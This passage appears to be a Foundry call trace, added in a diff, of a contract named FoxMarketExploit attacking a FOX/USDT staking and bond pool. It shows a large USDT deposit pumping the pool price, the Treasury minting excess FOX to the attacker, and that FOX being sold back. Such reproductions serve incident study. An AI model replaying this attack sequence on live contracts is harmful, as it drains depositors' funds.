+    │   │   │   │   ├─ [2893] FOX/USDT pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2786697198864505157273333 [2.786e24], 496041716814196640205248 [4.96e23], 1786834524 [1.786e9]
+    │   │   │   │   └─ ← [Return] [1000000000000000000 [1e18], 5603812687200652594 [5.603e18]]
+    │   │   │   ├─ [2411] 0x09be72336EEAfBfF6A9d30617a1Ff6099b866717::getRatio(1786809600 [1.786e9]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000002663
+    │   │   │   └─ ← [Return] 5436258687853353081 [5.436e18], 5603812687200652594 [5.603e18]
+    │   │   └─ ← [Return] 5436258687853353081 [5.436e18], 5603812687200652594 [5.603e18]
+    │   ├─ [25171] USDT::transfer(StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 450000000000000000000000000 [4.5e26])
+    │   │   ├─ emit Transfer(from: FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], amount: 450000000000000000000000000 [4.5e26])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x7043bae652c970425560f5ef12e16fb0f44ad00f0d3354ec7a452e0d8ed61736: 0 → 0x000000000000000000000000000000000000000001743b34e18439b502000000
+    │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000000001743b34e18439b502000000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─ [575126] StakerHelper::bond(450000000000000000000000000 [4.5e26], 5544983861610420142 [5.544e18])
+    │   │   ├─ [24562] USDT::approve(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], 450000000000000000000000000 [4.5e26])
+    │   │   │   ├─ emit Approval(owner: StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], spender: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], amount: 450000000000000000000000000 [4.5e26])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x065b7d960b2ef31efdec6568171208787524f4344f4d7615af1e00dc894e4144: 0 → 0x000000000000000000000000000000000000000001743b34e18439b502000000
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [547374] FoxLpBondsPool::stake(450000000000000000000000000 [4.5e26], 5544983861610420142 [5.544e18])
+    │   │   │   ├─ [547024] 0x58E2A853BB14e46BefD3148bd4280370fEA4655A::stake(450000000000000000000000000 [4.5e26], 5544983861610420142 [5.544e18]) [delegatecall]
+    │   │   │   │   ├─ [940] Referral::referralMap(StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
+    │   │   │   │   │   ├─ [590] 0x6d4174E48e6a930d6acc2BE5139607b1eB08EE60::referralMap(StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    │   │   │   │   │   └─ ← [Return] FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    │   │   │   │   ├─ [27934] USDT::transferFrom(StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], 450000000000000000000000000 [4.5e26])
+    │   │   │   │   │   ├─ emit Transfer(from: StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], to: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], amount: 450000000000000000000000000 [4.5e26])
+    │   │   │   │   │   ├─ emit Approval(owner: StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], spender: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], amount: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x7043bae652c970425560f5ef12e16fb0f44ad00f0d3354ec7a452e0d8ed61736: 0x000000000000000000000000000000000000000001743b34e18439b502000000 → 0
+    │   │   │   │   │   │   @ 0x065b7d960b2ef31efdec6568171208787524f4344f4d7615af1e00dc894e4144: 0x000000000000000000000000000000000000000001743b34e18439b502000000 → 0
+    │   │   │   │   │   │   @ 0x413fa75700df7021fa683d4bdd24b646d00e99f9cf44f0faa83351a3d8ce0560: 0 → 0x000000000000000000000000000000000000000001743b34e18439b502000000
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 450000000000000000000000000 [4.5e26]
+    │   │   │   │   ├─ [5151] Pancake router::getAmountsOut(1000000000000000000 [1e18], [0xdF81d50c6657487D19B66A1b5375E35A804Abb93, 0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   ├─ [893] FOX/USDT pair::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2786697198864505157273333 [2.786e24], 496041716814196640205248 [4.96e23], 1786834524 [1.786e9]
+    │   │   │   │   │   └─ ← [Return] [1000000000000000000 [1e18], 5603812687200652594 [5.603e18]]
+    │   │   │   │   ├─ [411] 0x09be72336EEAfBfF6A9d30617a1Ff6099b866717::getRatio(1786809600 [1.786e9]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000002663
+    │   │   │   │   ├─ [94087] Pancake router::swapExactTokensForTokens(225000000000000000000000000 [2.25e26], 0, [0x55d398326f99059fF775485246999027B3197955, 0xdF81d50c6657487D19B66A1b5375E35A804Abb93], FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], 1786836779 [1.786e9])
+    │   │   │   │   │   ├─ [893] FOX/USDT pair::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2786697198864505157273333 [2.786e24], 496041716814196640205248 [4.96e23], 1786834524 [1.786e9]
+    │   │   │   │   │   ├─ [15634] USDT::transferFrom(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], 225000000000000000000000000 [2.25e26])
+    │   │   │   │   │   │   ├─ emit Transfer(from: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], to: FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], amount: 225000000000000000000000000 [2.25e26])
+    │   │   │   │   │   │   ├─ emit Approval(owner: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], spender: Pancake router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 115792089237316195423570985008687907853269984665640338918059626747157255153259 [1.157e77])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x37025e3330194ee0e03a21efa8d3e355639248adadb8caddb0ff8143c3b7d13f: 0x000000000000000000000000000000000000000000024e1b286914ba44d946f5 → 0x000000000000000000000000000000000000000000bc6bb5992b3194c5d946f5
+    │   │   │   │   │   │   │   @ 0x8f03e9ce397d728bcaddc1944708a0f1502bfcf2e889eed50e4683230800e60f: 0xffffffffffffffffffffffffffffffffffffffffffffe64b00e8a94940f9e66b → 0xffffffffffffffffffffffffffffffffffffffffff45c8b090268c6ebff9e66b
+    │   │   │   │   │   │   │   @ 0x413fa75700df7021fa683d4bdd24b646d00e99f9cf44f0faa83351a3d8ce0560: 0x000000000000000000000000000000000000000001743b34e18439b502000000 → 0x000000000000000000000000000000000000000000ba1d9a70c21cda81000000
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [69171] FOX/USDT pair::swap(0, 489958218314447205652237 [4.899e23], FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], 0x)
+    │   │   │   │   │   │   ├─ [32203] FOX::transfer(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], 489958218314447205652237 [4.899e23])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], to: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], amount: 489958218314447205652237 [4.899e23])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x73c1410bbdd563e5851b127a7dfdb7fce800470419f92e6a03ffa92ccb3d164f: 0 → 0x0000000000000000000000000000000000000000000067c0b0303f17eadf570d
+    │   │   │   │   │   │   │   │   @ 0x1755711fa2897d98d04621013587851bde8dc8f6a3693a9659c5c727c52fbf96: 0x00000000000000000000000000000000000000000000690a79b094dbedb649c0 → 0x000000000000000000000000000000000000000000000149c98055c402d6f2b3
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [531] USDT::balanceOf(FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 227786697198864505157273333 [2.277e26]
+    │   │   │   │   │   │   ├─ [625] FOX::balanceOf(FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 6083498499749434553011 [6.083e21]
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 227786697198864505157273333 [2.277e26], reserve1: 6083498499749434553011 [6.083e21])
+    │   │   │   │   │   │   ├─ emit Swap(sender: Pancake router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 225000000000000000000000000 [2.25e26], amount1In: 0, amount0Out: 0, amount1Out: 489958218314447205652237 [4.899e23], to: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 10: 0x000000000000000000000000000000efc39aa39695e4cd55c106dd8e9ed3e418 → 0x000000000000000000000000000000eff516eeca207401bc3b87695e9b066814
+    │   │   │   │   │   │   │   @ 9: 0x0000000000000000000000000000000e2f3bb221fd964479ef254bbc7d07319d → 0x0000000000000000000000000000000e30cd17f6f42bd3eb7bd58f15ed08e90d
+    │   │   │   │   │   │   │   @ 8: 0x6a80ee5c00000000690a79b094dbedb649c0000000024e1b286914ba44d946f5 → 0x6a80f72b000000000149c98055c402d6f2b3000000bc6bb5992b3194c5d946f5
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return] [225000000000000000000000000 [2.25e26], 489958218314447205652237 [4.899e23]]
+    │   │   │   │   ├─ [531] USDT::balanceOf(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 225000000000000000000000000 [2.25e26]
+    │   │   │   │   ├─ [625] FOX::balanceOf(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 489958218314447205652237 [4.899e23]
+    │   │   │   │   ├─ [105931] Pancake router::addLiquidity(USDT: [0x55d398326f99059fF775485246999027B3197955], FOX: [0xdF81d50c6657487D19B66A1b5375E35A804Abb93], 225000000000000000000000000 [2.25e26], 489958218314447205652237 [4.899e23], 0, 0, FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], 1786836779 [1.786e9])
+    │   │   │   │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT: [0x55d398326f99059fF775485246999027B3197955], FOX: [0xdF81d50c6657487D19B66A1b5375E35A804Abb93]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803]
+    │   │   │   │   │   ├─ [893] FOX/USDT pair::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 227786697198864505157273333 [2.277e26], 6083498499749434553011 [6.083e21], 1786836779 [1.786e9]
+    │   │   │   │   │   ├─ [6034] USDT::transferFrom(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], 225000000000000000000000000 [2.25e26])
+    │   │   │   │   │   │   ├─ emit Transfer(from: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], to: FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], amount: 225000000000000000000000000 [2.25e26])
+    │   │   │   │   │   │   ├─ emit Approval(owner: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], spender: Pancake router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 115792089237316195423570985008687907853269984665640113918059626747157255153259 [1.157e77])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x37025e3330194ee0e03a21efa8d3e355639248adadb8caddb0ff8143c3b7d13f: 0x000000000000000000000000000000000000000000bc6bb5992b3194c5d946f5 → 0x00000000000000000000000000000000000000000176895009ed4e6f46d946f5
+    │   │   │   │   │   │   │   @ 0x413fa75700df7021fa683d4bdd24b646d00e99f9cf44f0faa83351a3d8ce0560: 0x000000000000000000000000000000000000000000ba1d9a70c21cda81000000 → 0
+    │   │   │   │   │   │   │   @ 0x8f03e9ce397d728bcaddc1944708a0f1502bfcf2e889eed50e4683230800e60f: 0xffffffffffffffffffffffffffffffffffffffffff45c8b090268c6ebff9e66b → 0xfffffffffffffffffffffffffffffffffffffffffe8bab161f646f943ef9e66b
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [7734] FOX::transferFrom(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], 6009074187719712225482 [6.009e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], to: FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], amount: 6009074187719712225482 [6.009e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x1755711fa2897d98d04621013587851bde8dc8f6a3693a9659c5c727c52fbf96: 0x000000000000000000000000000000000000000000000149c98055c402d6f2b3 → 0x00000000000000000000000000000000000000000000028f8a28660ea53fab7d
+    │   │   │   │   │   │   │   @ 0x73c1410bbdd563e5851b127a7dfdb7fce800470419f92e6a03ffa92ccb3d164f: 0x0000000000000000000000000000000000000000000067c0b0303f17eadf570d → 0x00000000000000000000000000000000000000000000667aef882ecd48769e43
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [79415] FOX/USDT pair::mint(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0])
+    │   │   │   │   │   │   ├─ [531] USDT::balanceOf(FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 452786697198864505157273333 [4.527e26]
+    │   │   │   │   │   │   ├─ [625] FOX::balanceOf(FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 12092572687469146778493 [1.209e22]
+    │   │   │   │   │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, amount: 464720209825656144593 [4.647e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], amount: 1161058529474901240397366 [1.161e24])
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 452786697198864505157273333 [4.527e26], reserve1: 12092572687469146778493 [1.209e22])
+    │   │   │   │   │   │   ├─ emit Mint(sender: Pancake router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 225000000000000000000000000 [2.25e26], amount1: 6009074187719712225482 [6.009e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x413fa75700df7021fa683d4bdd24b646d00e99f9cf44f0faa83351a3d8ce0560: 0 → 0x00000000000000000000000000000000000000000000f5dd1be78db09e333e36
+    │   │   │   │   │   │   │   @ 11: 0x000000000000000000000000f221485221354395b6cc1938aa2275fd7019dd48 → 0x000000000000000000000003bf1374e9502a520ee16d4708fcbf9a4319c84ca1
+    │   │   │   │   │   │   │   @ 0xce5a46cd565c798db4579e1721082d7b4156f14a385995b283ae5d8d572faf65: 0x00000000000000000000000000000000000000000000000027a246c3d8481890 → 0x00000000000000000000000000000000000000000000001958ec1f6883831b61
+    │   │   │   │   │   │   │   @ 8: 0x6a80f72b000000000149c98055c402d6f2b3000000bc6bb5992b3194c5d946f5 → 0x6a80f72b00000000028f8a28660ea53fab7d00000176895009ed4e6f46d946f5
+    │   │   │   │   │   │   │   @ 0: 0x00000000000000000000000000000000000000000000f8cf7659569ff190dd76 → 0x00000000000000000000000000000000000000000001eec5c38abcf53aff1e7d
+    │   │   │   │   │   │   └─ ← [Return] 1161058529474901240397366 [1.161e24]
+    │   │   │   │   │   └─ ← [Return] 225000000000000000000000000 [2.25e26], 6009074187719712225482 [6.009e21], 1161058529474901240397366 [1.161e24]
+    │   │   │   │   ├─ [531] USDT::balanceOf(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [105406] Treasury::lpBonds(1161058529474901240397366 [1.161e24], 82777517744964801045863495 [8.277e25], 540, FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2483325532348944031375904 [2.483e24])
+    │   │   │   │   │   ├─ [100538] 0x87614D97808DcDEcB069fe8489848fa1C001e04D::lpBonds(1161058529474901240397366 [1.161e24], 82777517744964801045863495 [8.277e25], 540, FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2483325532348944031375904 [2.483e24]) [delegatecall]
+    │   │   │   │   │   │   ├─ [10376] FOX/USDT pair::transferFrom(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], 0x000000000000000000000000000000000000dEaD, 1161058529474901240397366 [1.161e24])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], to: 0x000000000000000000000000000000000000dEaD, amount: 1161058529474901240397366 [1.161e24])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x413fa75700df7021fa683d4bdd24b646d00e99f9cf44f0faa83351a3d8ce0560: 0x00000000000000000000000000000000000000000000f5dd1be78db09e333e36 → 0
+    │   │   │   │   │   │   │   │   @ 0xb34209a263f6c38fe55f099e9e70f9d67e93982480ff3234a5e0108028ad164d: 0x00000000000000000000000000000000000000000000098e08109a9a8028e70c → 0x00000000000000000000000000000000000000000000ff6b23f8284b1e5c2542
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [14765] FOX::mint(Treasury: [0x361d08ff43761E6a7E8Fcabe48048AE9010801cc], 85260843277313745077239399 [8.526e25])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Treasury: [0x361d08ff43761E6a7E8Fcabe48048AE9010801cc], amount: 85260843277313745077239399 [8.526e25])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x290846d23e584288b566d0740508c9daa8d8ac708ff72f6e6ea50abf62d757a2: 0x00000000000000000000000000000000000000000000fea3ff105d14f59c8cb7 → 0x0000000000000000000000000000000000000000004785539261bdeb7e120b1e
+    │   │   │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000016ed534d8d6b9cd56879d → 0x00000000000000000000000000000000000000000047f584c82a379055cc0604
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [14413] 0x1ACfB89f020305EAf8c90493E76A846a4149C00A::mint(FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], 82777517744964801045863495 [8.277e25])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FoxLpBondsPool: [0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0], amount: 82777517744964801045863495 [8.277e25])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x73c1410bbdd563e5851b127a7dfdb7fce800470419f92e6a03ffa92ccb3d164f: 0x0000000000000000000000000000000000000000000004f67c6f0b51768441a4 → 0x000000000000000000000000000000000000000000447dc8b6f4bb5ae99a5deb
+    │   │   │   │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000fed8455bc52ed761f05b → 0x0000000000000000000000000000000000000000004577aa7fe175384a780ca2
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [14413] 0x0FF6a23CfaA850242ce50639243c999b5b693E65::mint(0x0F3D1891e036D44BFADF800eF9a62F9f9406Ef25, 9105526951946128115044984 [9.105e24])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0F3D1891e036D44BFADF800eF9a62F9f9406Ef25, amount: 9105526951946128115044984 [9.105e24])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000003db4a9a5c8b641fab1d → 0x000000000000000000000000000000000000000000078c06e5853a2607d2bd95
+    │   │   │   │   │   │   │   │   @ 0x266272fccca4835c07ca1652c8a8786279dac5806eb04c88b4141879cdd3e436: 0x00000000000000000000000000000000000000000000004c0c7bb73c0ba827c3 → 0x000000000000000000000000000000000000000000078877a76694d6af5b3a3b
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [25403] FOX::transfer(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2483325532348944031375904 [2.483e24])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: Treasury: [0x361d08ff43761E6a7E8Fcabe48048AE9010801cc], to: FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 2483325532348944031375904 [2.483e24])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x290846d23e584288b566d0740508c9daa8d8ac708ff72f6e6ea50abf62d757a2: 0x0000000000000000000000000000000000000000004785539261bdeb7e120b1e → 0x00000000000000000000000000000000000000000045777639960d1e68b2a8fe
+    │   │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x000000000000000000000000000000000000000000020ddd58cbb0cd155f6220
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [432] 0xF9b59f62E4fE55C5851E3b947236cb5958446F84::getBlockIdListCount() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000002c44
+    │   │   │   │   ├─ [25031] 0xF9b59f62E4fE55C5851E3b947236cb5958446F84::addBlockId()
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f72249f: 0 → 0x0000000000000000000000000000000000000000000000000000000006ec9958
+    │   │   │   │   │   │   @ 3: 11332 → 11333
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit UserStake(: 11332 [1.133e4], : StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], : 1786809600 [1.786e9], : 1786809600 [1.786e9], : 1833465600 [1.833e9], : 82777517744964801045863495 [8.277e25], : 450000000000000000000000000 [4.5e26], : 5436258687853353081 [5.436e18], : 2483325532348944031375904 [2.483e24], : 1786836779 [1.786e9])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x4476c586718afcb24283f6cab972c27f00ee9a76fbd7b55cd11409261c1db17e: 0 → 0x000000000000000000000000000000000000000000000000000000006d487700
+    │   │   │   │   │   @ 0x4476c586718afcb24283f6cab972c27f00ee9a76fbd7b55cd11409261c1db17c: 0 → 0x000000000000000000000000000000000000000000000000000000006a808d00
+    │   │   │   │   │   @ 0x4476c586718afcb24283f6cab972c27f00ee9a76fbd7b55cd11409261c1db17a: 0 → 11332
+    │   │   │   │   │   @ 0x4476c586718afcb24283f6cab972c27f00ee9a76fbd7b55cd11409261c1db17b: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   │   │   │   @ 0x4476c586718afcb24283f6cab972c27f00ee9a76fbd7b55cd11409261c1db17d: 0 → 0x000000000000000000000000000000000000000000000000000000006a808d00
+    │   │   │   │   │   @ 0x4476c586718afcb24283f6cab972c27f00ee9a76fbd7b55cd11409261c1db17f: 0 → 0x0000000000000000000000000000000000000000004478d23a85b00973161c47
+    │   │   │   │   └─ ← [Return]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [531] USDT::balanceOf(StakerHelper: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Stop]
+    │   ├─ [625] FOX::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 2483325532348944031375904 [2.483e24]
+    │   ├─ [24325] FOX::approve(Pancake router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2483325532348944031375904 [2.483e24])
+    │   │   ├─ emit Approval(owner: FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Pancake router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount: 2483325532348944031375904 [2.483e24])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0 → 0x000000000000000000000000000000000000000000020ddd58cbb0cd155f6220
+    │   │   └─ ← [Return] true
+    │   ├─ [65921] Pancake router::swapExactTokensForTokensSupportingFeeOnTransferTokens(2483325532348944031375904 [2.483e24], 1, [0xdF81d50c6657487D19B66A1b5375E35A804Abb93, 0x55d398326f99059fF775485246999027B3197955], FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1786836779 [1.786e9])
+    │   │   ├─ [17794] FOX::transferFrom(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], 2483325532348944031375904 [2.483e24])
+    │   │   │   ├─ emit Transfer(from: FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x75851881E7DC37A4181DF4fCaEaE49b73A33A672, amount: 62083138308723600784397 [6.208e22])
+    │   │   │   ├─ emit Transfer(from: FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803], amount: 2421242394040220430591507 [2.421e24])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x000000000000000000000000000000000000000000020ddd58cbb0cd155f6220 → 0
+    │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0x000000000000000000000000000000000000000000020ddd58cbb0cd155f6220 → 0
+    │   │   │   │   @ 0x9a5e572d374bc2d600b8f0ad5b841d93ca3cec15bfe6f4ac2dab54c7139ab6b1: 0x000000000000000000000000000000000000000000000003ae784eee62f5fed1 → 0x000000000000000000000000000000000000000000000d2937170026b6b1fade
+    │   │   │   │   @ 0x1755711fa2897d98d04621013587851bde8dc8f6a3693a9659c5c727c52fbf96: 0x00000000000000000000000000000000000000000000028f8a28660ea53fab7d → 0x0000000000000000000000000000000000000000000203475a5565a366e31190
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] USDT::balanceOf(FoxMarketExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [893] FOX/USDT pair::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 452786697198864505157273333 [4.527e26], 12092572687469146778493 [1.209e22], 1786836779 [1.786e9]
+    │   │   ├─ [625] FOX::balanceOf(FOX/USDT pair: [0xAAb18bCDEe287AEA288c0560612cAadf7c328803]) [staticcall]
+    │   │   │   └─ ← [Return] 2433334966727689577370000 [2.433e24]
